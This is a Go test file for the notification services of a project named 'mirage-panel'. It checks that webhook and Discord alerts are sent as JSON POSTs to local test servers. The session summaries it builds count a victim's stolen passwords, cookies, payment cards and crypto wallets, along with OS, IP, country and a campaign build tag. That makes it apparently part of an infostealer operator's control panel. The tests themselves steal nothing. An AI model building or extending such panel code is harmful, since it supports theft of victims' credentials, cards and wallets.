package services_test

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/user/mirage-panel/internal/services"
)

func TestSendWebhookNotification(t *testing.T) {
	var method, contentType string
	mux := http.NewServeMux()
	mux.HandleFunc("/webhook", func(w http.ResponseWriter, r *http.Request) {
		method = r.Method
		contentType = r.Header.Get("Content-Type")
		w.WriteHeader(http.StatusOK)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	payload := services.WebhookPayload{
		SessionID:   "test-session",
		CountryCode: "US",
		Passwords:   10,
		Cookies:     5,
	}

	err := services.SendWebhookNotification(server.URL+"/webhook", payload)
	if err != nil {
		t.Fatal(err)
	}
	if method != "POST" {
		t.Errorf("expected POST, got %s", method)
	}
	if contentType != "application/json" {
		t.Errorf("expected application/json, got %s", contentType)
	}
}

func TestSendWebhookNotification_ErrorStatus(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/webhook", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	payload := services.WebhookPayload{SessionID: "test"}
	err := services.SendWebhookNotification(server.URL+"/webhook", payload)
	if err == nil {
		t.Fatal("expected error for 500 status")
	}
}

func TestSendDiscordNotification(t *testing.T) {
	var method, contentType string
	mux := http.NewServeMux()
	mux.HandleFunc("/discord", func(w http.ResponseWriter, r *http.Request) {
		method = r.Method
		contentType = r.Header.Get("Content-Type")
		w.WriteHeader(http.StatusNoContent)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	session := services.SessionSummary{
		SessionID:   "test-session-id-1234",
		CountryCode: "US",
		Passwords:   10,
		Cookies:     5,
		Cards:       2,
		Wallets:     1,
		Os:          "Windows 10",
		IP:          "1.2.3.4",
		BuildTag:    "campaign-v2",
	}

	err := services.SendDiscordNotification(server.URL+"/discord", session)
	if err != nil {
		t.Fatal(err)
	}
	if method != "POST" {
		t.Errorf("expected POST, got %s", method)
	}
	if contentType != "application/json" {
		t.Errorf("expected application/json, got %s", contentType)
	}
}

func TestSendDiscordNotification_MinimalSession(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/discord", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNoContent)
	})
	server := httptest.NewServer(mux)
	defer server.Close()

	session := services.SessionSummary{
		SessionID:   "test-session",
		CountryCode: "RU",
	}

	err := services.SendDiscordNotification(server.URL+"/discord", session)
	if err != nil {
		t.Fatal(err)
	}
}
